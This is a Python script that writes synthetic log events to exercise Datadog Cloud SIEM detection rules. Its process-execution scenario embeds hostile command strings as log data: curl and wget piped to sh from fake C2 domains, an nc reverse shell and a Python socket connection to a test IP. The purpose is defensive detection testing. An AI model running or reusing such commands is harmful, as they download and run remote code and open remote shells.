#!/usr/bin/env python3
"""
Cloud SIEM Event Generator

Produces log lines that match Datadog Cloud SIEM out-of-the-box detection rules.
Each scenario writes to a separate log file so the Datadog Agent can tag them
with the correct source (sshd, auth, dns, sudo, auditd, firewall).

Usage:
    python event-generator.py                          # Run all scenarios once
    python event-generator.py --loop --interval 30     # Run continuously
    python event-generator.py --scenario brute_force   # Run one scenario
    python event-generator.py --output-dir /var/log/sandbox  # Custom output dir
"""

import argparse
import json
import os
import random
import sys
import time
from datetime import datetime, timezone

ATTACKER_IPS = [
    "198.51.100.42",
    "203.0.113.99",
    "192.0.2.200",
    "45.33.32.156",
]

INTERNAL_IPS = [
    "10.0.1.50",
    "10.0.2.100",
    "172.16.0.15",
]

USERNAMES = ["admin", "root", "testuser", "bits", "deploy", "service-account"]

GEO_LOCATIONS = [
    {"city": "New York", "country": "US", "lat": 40.7128, "lon": -74.0060},
    {"city": "Moscow", "country": "RU", "lat": 55.7558, "lon": 37.6173},
    {"city": "Beijing", "country": "CN", "lat": 39.9042, "lon": 116.4074},
    {"city": "Lagos", "country": "NG", "lat": 6.5244, "lon": 3.3792},
    {"city": "San Francisco", "country": "US", "lat": 37.7749, "lon": -122.4194},
]

C2_DOMAINS = [
    "evil-c2-server.xyz",
    "malware-update.top",
    "data-exfil-node.cc",
    "botnet-controller.tk",
]

DEFAULT_OUTPUT_DIR = "/var/log/sandbox"


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def emit(log_entry, filepath):
    line = json.dumps(log_entry)
    if filepath:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "a") as f:
            f.write(line + "\n")
    else:
        print(line, flush=True)


def log_path(output_dir, filename):
    if output_dir:
        return os.path.join(output_dir, filename)
    return None


def brute_force(output_dir=None):
    """SSH brute force: 15 failures then 1 success from the same IP."""
    print("[SIEM] Generating: Brute force SSH login attempts", file=sys.stderr)
    ip = random.choice(ATTACKER_IPS)
    fp = log_path(output_dir, "sshd.log")
    for _ in range(15):
        user = random.choice(USERNAMES)
        emit({
            "timestamp": ts(),
            "status": "warning",
            "host": "sandbox-host",
            "service": "sshd",
            "message": f"Failed password for {user} from {ip} port {random.randint(40000, 65000)} ssh2",
            "evt": {
                "name": "authentication",
                "category": "authentication",
                "outcome": "failure",
            },
            "network": {"client": {"ip": ip}},
            "usr": {"id": user},
        }, fp)
        time.sleep(0.2)
    emit({
        "timestamp": ts(),
        "status": "critical",
        "host": "sandbox-host",
        "service": "sshd",
        "message": f"Accepted password for root from {ip} port 54321 ssh2",
        "evt": {
            "name": "authentication",
            "category": "authentication",
            "outcome": "success",
        },
        "network": {"client": {"ip": ip}},
        "usr": {"id": "root"},
    }, fp)


def impossible_travel(output_dir=None):
    """Auth from NYC then Moscow within seconds for the same user."""
    print("[SIEM] Generating: Impossible travel", file=sys.stderr)
    user = "admin"
    loc1 = GEO_LOCATIONS[0]  # New York
    loc2 = GEO_LOCATIONS[1]  # Moscow
    fp = log_path(output_dir, "auth.log")

    emit({
        "timestamp": ts(),
        "status": "info",
        "host": "sandbox-host",
        "service": "webapp",
        "message": f"User {user} logged in from {loc1['city']}, {loc1['country']}",
        "evt": {
            "name": "authentication",
            "category": "authentication",
            "outcome": "success",
        },
        "network": {
            "client": {
                "ip": ATTACKER_IPS[0],
                "geoip": {
                    "city_name": loc1["city"],
                    "country_iso_code": loc1["country"],
                    "location": {"lat": loc1["lat"], "lon": loc1["lon"]},
                },
            },
        },
        "usr": {"id": user},
    }, fp)

    time.sleep(2)

    emit({
        "timestamp": ts(),
        "status": "info",
        "host": "sandbox-host",
        "service": "webapp",
        "message": f"User {user} logged in from {loc2['city']}, {loc2['country']}",
        "evt": {
            "name": "authentication",
            "category": "authentication",
            "outcome": "success",
        },
        "network": {
            "client": {
                "ip": ATTACKER_IPS[1],
                "geoip": {
                    "city_name": loc2["city"],
                    "country_iso_code": loc2["country"],
                    "location": {"lat": loc2["lat"], "lon": loc2["lon"]},
                },
            },
        },
        "usr": {"id": user},
    }, fp)


def suspicious_dns(output_dir=None):
    """DNS queries to known C2/malware domains."""
    print("[SIEM] Generating: Suspicious DNS queries", file=sys.stderr)
    fp = log_path(output_dir, "dns.log")
    for domain in C2_DOMAINS:
        emit({
            "timestamp": ts(),
            "status": "warning",
            "host": "sandbox-host",
            "service": "dns",
            "message": f"DNS query for {domain} from {random.choice(INTERNAL_IPS)}",
            "dns": {"question": {"name": domain, "type": "A"}},
            "network": {"client": {"ip": random.choice(INTERNAL_IPS)}},
        }, fp)
        time.sleep(0.5)


def privilege_escalation(output_dir=None):
    """sudo failures from unprivileged users."""
    print("[SIEM] Generating: Privilege escalation attempts", file=sys.stderr)
    fp = log_path(output_dir, "sudo.log")
    for _ in range(5):
        user = random.choice(["testuser", "www-data", "nobody"])
        emit({
            "timestamp": ts(),
            "status": "warning",
            "host": "sandbox-host",
            "service": "sudo",
            "message": f"{user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
            "evt": {
                "name": "privilege_escalation",
                "category": "authentication",
                "outcome": "failure",
            },
            "usr": {"id": user},
        }, fp)
        time.sleep(0.3)


def suspicious_process(output_dir=None):
    """Unusual process executions: base64 decode, reverse shell, curl piped to sh."""
    print("[SIEM] Generating: Suspicious process execution", file=sys.stderr)
    fp = log_path(output_dir, "auditd.log")
    commands = [
        ("base64", "base64 -d /tmp/encoded_payload | bash"),
        ("wget", "wget -q http://evil-c2-server.xyz/shell.sh -O /tmp/shell.sh"),
        ("nc", "nc -e /bin/bash 198.51.100.42 4444"),
        ("curl", "curl -s http://malware-update.top/payload | sh"),
        ("python3", "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"198.51.100.42\",4444))'"),
    ]
    for proc_name, cmd in commands:
        emit({
            "timestamp": ts(),
            "status": "critical",
            "host": "sandbox-host",
            "service": "auditd",
            "message": f"Suspicious process execution: {cmd}",
            "process": {
                "name": proc_name,
                "command_line": cmd,
                "pid": random.randint(1000, 65000),
            },
            "usr": {"id": "www-data"},
        }, fp)
        time.sleep(0.5)


def data_exfiltration(output_dir=None):
    """Large outbound data transfers to suspicious IPs."""
    print("[SIEM] Generating: Data exfiltration patterns", file=sys.stderr)
    fp = log_path(output_dir, "firewall.log")
    for _ in range(3):
        bytes_out = random.randint(50_000_000, 500_000_000)
        dest_ip = random.choice(ATTACKER_IPS)
        emit({
            "timestamp": ts(),
            "status": "warning",
            "host": "sandbox-host",
            "service": "firewall",
            "message": f"Large outbound transfer to {dest_ip}: {bytes_out // 1_000_000}MB",
            "network": {
                "client": {"ip": random.choice(INTERNAL_IPS)},
                "destination": {"ip": dest_ip, "port": 443},
                "bytes_written": bytes_out,
            },
        }, fp)
        time.sleep(1)


SCENARIOS = {
    "brute_force": brute_force,
    "impossible_travel": impossible_travel,
    "suspicious_dns": suspicious_dns,
    "privilege_escalation": privilege_escalation,
    "suspicious_process": suspicious_process,
    "data_exfiltration": data_exfiltration,
}


def main():
    parser = argparse.ArgumentParser(description="Cloud SIEM Event Generator")
    parser.add_argument("--scenario", choices=list(SCENARIOS.keys()),
                        help="Run a specific scenario")
    parser.add_argument("--output-dir", default=DEFAULT_OUTPUT_DIR,
                        help=f"Directory for log files (default: {DEFAULT_OUTPUT_DIR})")
    parser.add_argument("--stdout", action="store_true",
                        help="Print to stdout instead of writing files")
    parser.add_argument("--loop", action="store_true",
                        help="Run continuously")
    parser.add_argument("--interval", type=int, default=60,
                        help="Seconds between loops (default: 60)")
    args = parser.parse_args()

    output_dir = None if args.stdout else args.output_dir

    if output_dir:
        os.makedirs(output_dir, exist_ok=True)
        print(f"[SIEM] Writing logs to {output_dir}/", file=sys.stderr)

    while True:
        if args.scenario:
            SCENARIOS[args.scenario](output_dir)
        else:
            for name, fn in SCENARIOS.items():
                fn(output_dir)
                time.sleep(2)

        if not args.loop:
            break

        print(f"[SIEM] Sleeping {args.interval}s before next round...", file=sys.stderr)
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
